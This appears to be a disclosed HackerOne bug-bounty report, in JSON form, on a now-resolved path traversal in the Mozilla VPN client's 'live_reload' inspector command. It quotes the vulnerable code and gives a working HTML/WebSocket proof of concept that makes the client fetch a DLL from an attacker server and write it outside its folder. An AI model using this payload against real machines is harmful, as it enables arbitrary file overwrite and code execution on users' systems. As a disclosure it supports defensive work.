{
  "id": 2995025,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTk1MDI1",
  "url": "https://hackerone.com/reports/2995025",
  "title": "Mozilla VPN Clients: RCE via file write and path traversal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2025-02-15T12:46:42.907Z",
  "submitted_at": "2025-02-15T12:46:43.220Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "trein",
    "url": "/trein",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/61un6m9b8kgltsqgg381lmq0om9n/d86f3034cedc97192c6e25b49fb25d458f11529df403793678d43ead36f13cc4"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61236,
    "url": "https://hackerone.com/mozilla",
    "handle": "mozilla",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Mozilla",
      "twitter_handle": "",
      "website": "https://www.mozilla.org",
      "about": "Mozilla web bug bounty program specific to encouraging security research in Mozilla's products and web services."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2025-07-29T09:53:41.088Z",
  "bug_reporter_agreed_on_going_public_at": "2025-07-18T09:39:00.059Z",
  "team_member_agreed_on_going_public_at": "2025-07-29T09:53:40.640Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nHi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the \"live_reload\" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows).\n\nVulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):\n```\nQObject::connect(\n      request, &NetworkRequest::requestCompleted,\n      [this, path, dummy_task](const QByteArray& data) {\n        dummy_task->deleteLater();\n        auto temp_path = QString(\"%1/%2\").arg(m_qml_folder, path.fileName());\n        auto temp_file = new QFile(temp_path);\n        temp_file->open(QIODevice::WriteOnly);\n        if (!temp_file->write(data)) {\n          logger.warning() << \"Unable to write to file:\"\n                           << temp_file->fileName();\n          return;\n        }\n        if (!temp_file->flush()) {\n          logger.warning() << \"Unable to flush to file:\"\n                           << temp_file->fileName();\n          return;\n        }\n        temp_file->close();\n        QFileInfo info(temp_path);\n        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));\n      });\n```\nYou can see in the above snippet, that the temp_path  is simply a concatenation of a set directory and our filename.\n\n## Steps To Reproduce:\n  \n1. Download Mozilla VPN here: https://www.mozilla.org/en-US/products/vpn/download/\n  1. Turn on developer mode (see video PoC below):\n      1. Open the help menu\n      1. Click  the \"Help\" title 6 times rapidly\n      1. In the developer options, check \"Use Staging Servers\"\n      1. Fully close and reopen\n  1. Save the following HTML and open it (change to your attacker_server)\n``` html\n<script>\n    var ws = new WebSocket('ws://localhost:8765/');\n    var attacker_server = \"███████\" // needs to be HTTP, no HTTPS\n    \n    payload = `live_reload ${attacker_server}/..\\\\..\\\\traversal_poc.dll`\n\n    ws.onopen = function() {\n        ws.send(payload); \n    };\n    ws.onmessage = function(event) {\n        document.getElementById(\"data\").innerText += event.data + \"\\n\";\n    };\n </script>\n <h1>Data retrieved:</h1>\n <div id=\"data\"></div>\n```\n1. Notice the file was written to C:\\Users\\user\\AppData\\Local\\Mozilla instead of C:\\Users\\user\\AppData\\Local\\Mozilla\\Mozilla VPN\\hot_reload.\n\n## Supporting Material/References:\n█████\n\nHappy to help if anything is unclear!\n\n## Impact\n\nAny file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.",
  "bounty_amount": "6000.0",
  "formatted_bounty": "$6,000",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2025-08-17T09:39:00.385Z",
  "allow_singular_disclosure_after": 1639430.870926128,
  "singular_disclosure_allowed": false,
  "vote_count": 2,
  "voters": [
    "n1m0",
    "2026"
  ],
  "severity": {
    "rating": "high",
    "score": 8.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 303805,
    "asset_type": "OTHER",
    "asset_identifier": "Mozilla VPN Clients",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 733541,
      "category": "team",
      "content": "The report identifies a path traversal vulnerability in Mozilla VPN's client software that leads to Remote Code Execution (RCE). The vulnerability exists in the \"live_reload\" command of the client's inspector feature, which can be accessed when the client is in developer mode with \"Use Staging Servers\" enabled. The vulnerable code in the InspectorHotreloader::fetchAndAnnounce() function fails to properly sanitize file paths when downloading remote files to a temporary folder, allowing path traversal via the \"..\" sequence in Windows file paths. This enables an attacker to write arbitrary files to any location on the filesystem, which can be leveraged to achieve code execution.",
      "updated_at": "2025-07-29T10:12:07.131Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 2465541,
        "username": "frida-k",
        "name": "Frida",
        "bio": "Out April 16-21. Expect delayed response.",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2022-09-21T23:39:33.826Z",
        "url": "https://hackerone.com/frida-k",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
